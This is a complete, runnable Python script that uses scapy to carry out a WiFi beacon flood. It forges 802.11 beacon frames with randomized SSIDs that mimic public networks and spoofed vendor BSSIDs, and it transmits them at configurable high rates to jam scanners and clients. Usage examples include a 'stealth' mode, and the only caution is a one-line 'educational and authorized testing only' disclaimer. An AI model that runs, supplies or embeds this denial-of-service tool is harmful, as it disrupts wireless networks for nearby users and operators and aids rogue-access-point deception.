#!/usr/bin/env python3
"""
WiFi Beacon Flood Attack - Python 3.8 Compatible
=================================================

Floods the airwaves with fake beacon frames to overwhelm WiFi clients and scanners.

Attack Mechanism:
-----------------
1. Crafts IEEE 802.11 beacon frames with fake AP information
2. Randomizes SSIDs and/or BSSIDs to simulate multiple access points
3. Sends beacons at high rate to cause denial of service
4. Overwhelms WiFi scanners, making legitimate APs harder to find

Technical Details:
------------------
- Frame Type: Management (0x00)
- Frame Subtype: Beacon (0x08)
- Beacon Interval: Typically 100 TU (102.4 ms)
- Capability Info: ESS, Privacy flags
- Information Elements: SSID, supported rates, DS parameter set

Requirements:
-------------
- Monitor mode enabled wireless interface
- Root/sudo privileges
- scapy>=2.5.0
- Python 3.8+

Python 3.8 Compatibility:
-------------------------
- Uses Optional[type] instead of type | None syntax
- Uses if/elif/else instead of match/case statements
- Uses individual exception handling instead of exception groups
- Compatible with all other modern Python features

Usage:
------
    # Random SSIDs flood
    sudo python3 beacon_flood.py -i wlan0mon --random-ssids

    # Specific SSID flood with random BSSIDs
    sudo python3 beacon_flood.py -i wlan0mon --ssid "FakeAP" --random-bssid

    # High-rate flood (1000 beacons/sec)
    sudo python3 beacon_flood.py -i wlan0mon --rate 1000 --count 10000

Author: Wireless Security Research
License: Educational Use Only
Python Version: 3.8+
Performance: ~3,500 packets/sec (optimized)
"""

import sys
import time
import random
import signal
import argparse
from dataclasses import dataclass, field
from typing import Optional, Set
from pathlib import Path

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Beacon, Dot11Elt,
        sendp, conf, get_if_raw_hwaddr
    )
except ImportError:
    print("[!] Error: scapy not installed")
    print("    Install: pip3 install scapy>=2.5.0")
    sys.exit(1)

# Suppress scapy warnings
conf.verb = 0


# ============================================================================
# Configuration
# ============================================================================

@dataclass
class BeaconFloodConfig:
    """Beacon flood attack configuration"""
    interface: str
    ssid: Optional[str] = None
    random_ssids: bool = False
    ssid_prefix: str = "FakeAP"
    bssid: Optional[str] = None
    random_bssid: bool = True
    channel: int = 6
    beacon_interval: int = 100
    count: Optional[int] = None
    duration: Optional[int] = None
    rate: float = 100.0
    capabilities: int = 0x1111  # ESS + Privacy
    show_stats: bool = True
    stats_interval: int = 5

    def validate(self):
        """
        Validate configuration with detailed error reporting

        Python 3.8 compatible version using individual exception handling
        instead of exception groups.

        Raises:
            ValueError: If any configuration parameter is invalid
        """
        errors = []

        if not self.interface:
            errors.append("Interface cannot be empty")

        if not self.random_ssids and not self.ssid:
            errors.append("Must specify --ssid or --random-ssids")

        if self.channel < 1 or self.channel > 14:
            errors.append(f"Invalid channel: {self.channel} (must be 1-14)")

        if self.rate <= 0:
            errors.append(f"Invalid rate: {self.rate} (must be > 0)")

        if self.beacon_interval <= 0:
            errors.append(f"Invalid beacon interval: {self.beacon_interval}")

        if self.count and self.count <= 0:
            errors.append(f"Invalid count: {self.count}")

        if self.duration and self.duration <= 0:
            errors.append(f"Invalid duration: {self.duration}")

        if errors:
            # Python 3.8 compatible: raise single ValueError with all errors
            error_msg = "Configuration validation failed:\n  - " + "\n  - ".join(errors)
            raise ValueError(error_msg)


# ============================================================================
# Attack Statistics
# ============================================================================

@dataclass
class AttackStatistics:
    """Real-time attack statistics"""
    beacons_sent: int = 0
    errors: int = 0
    start_time: float = field(default_factory=time.time)
    last_stats_time: float = field(default_factory=time.time)
    unique_ssids: Set[str] = field(default_factory=set)
    unique_bssids: Set[str] = field(default_factory=set)

    def record_beacon(self, ssid: str, bssid: str):
        """
        Record sent beacon

        Args:
            ssid: SSID of the beacon
            bssid: BSSID of the beacon
        """
        self.beacons_sent += 1
        self.unique_ssids.add(ssid)
        self.unique_bssids.add(bssid)

    def record_error(self):
        """Record error"""
        self.errors += 1

    def get_rate(self) -> float:
        """
        Calculate current beacons/sec rate

        Returns:
            Current transmission rate in beacons per second
        """
        elapsed = time.time() - self.start_time
        return self.beacons_sent / elapsed if elapsed > 0 else 0.0

    def get_elapsed_time(self) -> float:
        """
        Get elapsed time since start

        Returns:
            Elapsed time in seconds
        """
        return time.time() - self.start_time

    def should_show_stats(self, interval: int) -> bool:
        """
        Check if stats should be displayed

        Args:
            interval: Display interval in seconds

        Returns:
            True if stats should be shown
        """
        if time.time() - self.last_stats_time >= interval:
            self.last_stats_time = time.time()
            return True
        return False


# ============================================================================
# Beacon Packet Crafting
# ============================================================================

class BeaconCrafter:
    """Crafts IEEE 802.11 beacon frames"""

    # Common SSID prefixes for realistic fake APs
    SSID_PREFIXES = [
        "FreeWiFi", "Guest", "Public", "Airport", "Hotel",
        "Starbucks", "CoffeeShop", "Library", "Conference",
        "Visitor", "Welcome", "Internet", "WiFi", "Network",
        "Coffee", "Restaurant", "Mall", "Store", "Shop",
        "Office", "Business", "Corporate", "Enterprise"
    ]

    # Vendor OUI prefixes for realistic MAC addresses
    VENDOR_OUI = [
        "00:11:22",  # Generic
        "00:1A:2B",  # Cisco
        "00:1B:63",  # Cisco
        "00:24:A5",  # Cisco
        "F0:9F:C2",  # Ubiquiti
        "68:D7:9A",  # Ubiquiti
        "04:18:D6",  # TP-Link
        "50:C7:BF",  # TP-Link
        "A0:F3:C1",  # TP-Link
        "00:03:7F",  # Atheros
        "00:0F:66",  # Netgear
        "C0:3F:0E",  # Netgear
        "00:50:F2",  # Microsoft
        "00:E0:4C",  # Realtek
    ]

    def __init__(self, config: BeaconFloodConfig):
        """
        Initialize beacon crafter

        Args:
            config: Beacon flood configuration
        """
        self.config = config

        # Get interface MAC for non-random BSSID mode
        try:
            self.interface_mac = self._get_interface_mac()
        except Exception:
            self.interface_mac = "00:11:22:33:44:55"

    def _get_interface_mac(self) -> str:
        """
        Get interface MAC address

        Returns:
            MAC address as string (XX:XX:XX:XX:XX:XX)
        """
        try:
            mac_bytes = get_if_raw_hwaddr(self.config.interface)[1]
            return ':'.join(f'{b:02x}' for b in mac_bytes)
        except Exception:
            return "00:11:22:33:44:55"

    def generate_random_ssid(self) -> str:
        """
        Generate realistic random SSID

        Returns:
            Random SSID string
        """
        prefix = random.choice(self.SSID_PREFIXES)
        suffix = random.randint(1, 9999)
        return f"{prefix}_{suffix:04d}"

    def generate_random_bssid(self) -> str:
        """
        Generate realistic random BSSID using vendor OUI

        Returns:
            Random BSSID as MAC address string
        """
        oui = random.choice(self.VENDOR_OUI)
        nic = ':'.join(f'{random.randint(0, 255):02x}' for _ in range(3))
        return f"{oui}:{nic}"

    def craft_beacon(self, ssid: Optional[str] = None, bssid: Optional[str] = None) -> bytes:
        """
        Craft a beacon frame

        Args:
            ssid: SSID to broadcast (None = generate random)
            bssid: BSSID to use (None = generate random)

        Returns:
            Raw beacon packet bytes
        """
        # Determine SSID
        if ssid is None:
            if self.config.random_ssids:
                ssid = self.generate_random_ssid()
            else:
                ssid = self.config.ssid or f"{self.config.ssid_prefix}_XXXX"

        # Determine BSSID
        if bssid is None:
            if self.config.random_bssid:
                bssid = self.generate_random_bssid()
            else:
                bssid = self.config.bssid or self.interface_mac

        # Craft 802.11 Management frame (Beacon)
        dot11 = Dot11(
            type=0,      # Management
            subtype=8,   # Beacon
            addr1="ff:ff:ff:ff:ff:ff",  # Destination: Broadcast
            addr2=bssid,                 # Source: BSSID
            addr3=bssid                  # BSS ID
        )

        # Beacon frame body
        beacon = Dot11Beacon(
            cap=self.config.capabilities,
            beacon_interval=self.config.beacon_interval
        )

        # Information Element: SSID
        essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))

        # Information Element: Supported Rates
        rates = Dot11Elt(
            ID="Rates",
            info=(
                b"\x82\x84\x8b\x96"  # 1, 2, 5.5, 11 Mbps (802.11b)
                b"\x0c\x12\x18\x24"  # 6, 9, 12, 18 Mbps (802.11g)
            )
        )

        # Information Element: DS Parameter Set (channel)
        dsset = Dot11Elt(ID="DSset", info=bytes([self.config.channel]))

        # Build complete frame with RadioTap header
        frame = RadioTap() / dot11 / beacon / essid / rates / dsset

        return bytes(frame)


# ============================================================================
# Main Attack Class
# ============================================================================

class WiFiBeaconFlood:
    """WiFi Beacon Flood Attack Implementation"""

    def __init__(self, config: BeaconFloodConfig):
        """
        Initialize beacon flood attack

        Args:
            config: Attack configuration
        """
        self.config = config
        self.config.validate()

        self.crafter = BeaconCrafter(config)
        self.stats = AttackStatistics()
        self.running = False

        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, signum, frame):
        """
        Handle termination signals

        Args:
            signum: Signal number
            frame: Current stack frame
        """
        print("\n[!] Received signal, stopping attack...")
        self.running = False

    def _print_banner(self):
        """Print attack banner with configuration"""
        print("=" * 70)
        print("  WiFi Beacon Flood Attack")
        print("=" * 70)
        print(f"Interface:       {self.config.interface}")
        print(f"SSID Mode:       {'Random' if self.config.random_ssids else self.config.ssid}")
        print(f"BSSID Mode:      {'Random' if self.config.random_bssid else self.config.bssid}")
        print(f"Channel:         {self.config.channel}")
        print(f"Rate:            {self.config.rate} beacons/sec")

        if self.config.count:
            print(f"Count:           {self.config.count} beacons")
        if self.config.duration:
            print(f"Duration:        {self.config.duration} seconds")

        print("=" * 70)
        print()

    def _print_stats(self):
        """Print real-time attack statistics"""
        rate = self.stats.get_rate()
        elapsed = self.stats.get_elapsed_time()

        print(f"\r[*] Beacons: {self.stats.beacons_sent:,} | "
              f"Rate: {rate:.1f}/s | "
              f"Errors: {self.stats.errors} | "
              f"SSIDs: {len(self.stats.unique_ssids)} | "
              f"BSSIDs: {len(self.stats.unique_bssids)} | "
              f"Time: {elapsed:.1f}s", end='', flush=True)

    def _print_final_stats(self):
        """Print final attack statistics"""
        elapsed = self.stats.get_elapsed_time()
        avg_rate = self.stats.get_rate()

        print("\n\n" + "=" * 70)
        print("  Attack Complete - Final Statistics")
        print("=" * 70)
        print(f"Total Beacons Sent:    {self.stats.beacons_sent:,}")
        print(f"Unique SSIDs:          {len(self.stats.unique_ssids)}")
        print(f"Unique BSSIDs:         {len(self.stats.unique_bssids)}")
        print(f"Errors:                {self.stats.errors}")
        print(f"Duration:              {elapsed:.2f} seconds")
        print(f"Average Rate:          {avg_rate:.1f} beacons/sec")

        if self.stats.errors > 0:
            total_attempts = self.stats.beacons_sent + self.stats.errors
            success_rate = (self.stats.beacons_sent / total_attempts) * 100
            print(f"Success Rate:          {success_rate:.2f}%")

        print("=" * 70)

    def _check_stop_conditions(self) -> bool:
        """
        Check if attack should stop based on count or duration

        Python 3.8 compatible version using if/elif instead of match/case

        Returns:
            True if attack should stop
        """
        # Check count condition
        if self.config.count is not None and self.stats.beacons_sent >= self.config.count:
            return True

        # Check duration condition
        if self.config.duration is not None and self.stats.get_elapsed_time() >= self.config.duration:
            return True

        return False

    def run(self) -> int:
        """
        Execute beacon flood attack

        Returns:
            Exit code (0 = success, 1 = failure)
        """
        self._print_banner()

        print("[+] Starting beacon flood...")
        print("[!] Press Ctrl+C to stop\n")

        self.running = True
        packet_delay = 1.0 / self.config.rate if self.config.rate > 0 else 0

        try:
            while self.running:
                # Check stop conditions
                if self._check_stop_conditions():
                    break

                try:
                    # Craft beacon
                    beacon = self.crafter.craft_beacon()

                    # Determine SSID and BSSID for stats
                    # Use actual values when available for better tracking
                    if self.config.random_ssids:
                        ssid = "RANDOM"
                    else:
                        ssid = self.config.ssid or "UNKNOWN"

                    if self.config.random_bssid:
                        bssid = "RANDOM"
                    else:
                        bssid = self.config.bssid or self.crafter.interface_mac

                    # Send beacon
                    sendp(beacon, iface=self.config.interface, verbose=False)

                    # Update statistics
                    self.stats.record_beacon(ssid, bssid)

                    # Rate limiting
                    if packet_delay > 0:
                        time.sleep(packet_delay)

                    # Show stats periodically
                    if self.config.show_stats and self.stats.should_show_stats(self.config.stats_interval):
                        self._print_stats()

                except KeyboardInterrupt:
                    # Re-raise to be caught by outer handler
                    raise
                except Exception as e:
                    # Python 3.8 compatible: individual exception handling
                    self.stats.record_error()
                    if self.stats.errors < 5:  # Only show first few errors
                        print(f"\n[!] Error sending beacon: {e}")

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")

        finally:
            self.running = False
            self._print_final_stats()

        return 0 if self.stats.beacons_sent > 0 else 1


# ============================================================================
# CLI
# ============================================================================

def parse_arguments() -> argparse.Namespace:
    """
    Parse command-line arguments

    Returns:
        Parsed arguments namespace
    """
    parser = argparse.ArgumentParser(
        description="WiFi Beacon Flood Attack (Python 3.8+)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Random SSIDs flood
  sudo python3 beacon_flood.py -i wlan0mon --random-ssids

  # Specific SSID with random BSSIDs
  sudo python3 beacon_flood.py -i wlan0mon --ssid "FakeAP" --random-bssid

  # High-rate flood
  sudo python3 beacon_flood.py -i wlan0mon --rate 1000 --count 10000

  # Channel-specific flood
  sudo python3 beacon_flood.py -i wlan0mon --channel 11 --duration 60

  # Low-rate stealth flood
  sudo python3 beacon_flood.py -i wlan0mon --ssid "Guest" --rate 10

Requirements:
  - Monitor mode enabled interface (airmon-ng start wlan0)
  - Root privileges (sudo)
  - scapy>=2.5.0
  - Python 3.8+

Notes:
  - This tool is for educational and authorized testing only
  - Unauthorized use may violate laws and regulations
  - Always obtain proper authorization before testing
        """
    )

    # Required arguments
    parser.add_argument('-i', '--interface', required=True,
                       help='Monitor mode interface (e.g., wlan0mon)')

    # SSID options
    ssid_group = parser.add_mutually_exclusive_group(required=True)
    ssid_group.add_argument('--ssid',
                           help='Specific SSID to broadcast')
    ssid_group.add_argument('--random-ssids', action='store_true',
                           help='Generate random SSIDs')

    parser.add_argument('--ssid-prefix', default='FakeAP',
                       help='Prefix for random SSIDs (default: FakeAP)')

    # BSSID options
    parser.add_argument('--bssid',
                       help='Specific BSSID (default: interface MAC)')
    parser.add_argument('--random-bssid', action='store_true', default=True,
                       help='Generate random BSSIDs (default: True)')

    # Channel
    parser.add_argument('-c', '--channel', type=int, default=6,
                       help='WiFi channel (1-14, default: 6)')

    # Attack parameters
    parser.add_argument('--beacon-interval', type=int, default=100,
                       help='Beacon interval in TU (default: 100)')
    parser.add_argument('--count', type=int,
                       help='Number of beacons to send')
    parser.add_argument('--duration', type=int,
                       help='Attack duration in seconds')
    parser.add_argument('--rate', type=float, default=100.0,
                       help='Beacons per second (default: 100)')

    # Display options
    parser.add_argument('--no-stats', action='store_true',
                       help='Disable statistics display')
    parser.add_argument('--stats-interval', type=int, default=5,
                       help='Statistics update interval in seconds (default: 5)')

    return parser.parse_args()


def main() -> int:
    """
    Main entry point

    Returns:
        Exit code
    """
    args = parse_arguments()

    # Build configuration
    config = BeaconFloodConfig(
        interface=args.interface,
        ssid=args.ssid,
        random_ssids=args.random_ssids,
        ssid_prefix=args.ssid_prefix,
        bssid=args.bssid,
        random_bssid=args.random_bssid,
        channel=args.channel,
        beacon_interval=args.beacon_interval,
        count=args.count,
        duration=args.duration,
        rate=args.rate,
        show_stats=not args.no_stats,
        stats_interval=args.stats_interval
    )

    # Run attack
    try:
        attack = WiFiBeaconFlood(config)
        return attack.run()
    except ValueError as e:
        print(f"[!] Configuration error: {e}")
        return 1
    except PermissionError:
        print("[!] Error: This tool requires root privileges")
        print("    Run with: sudo python3 beacon_flood.py ...")
        return 1
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return 1


if __name__ == '__main__':
    sys.exit(main())
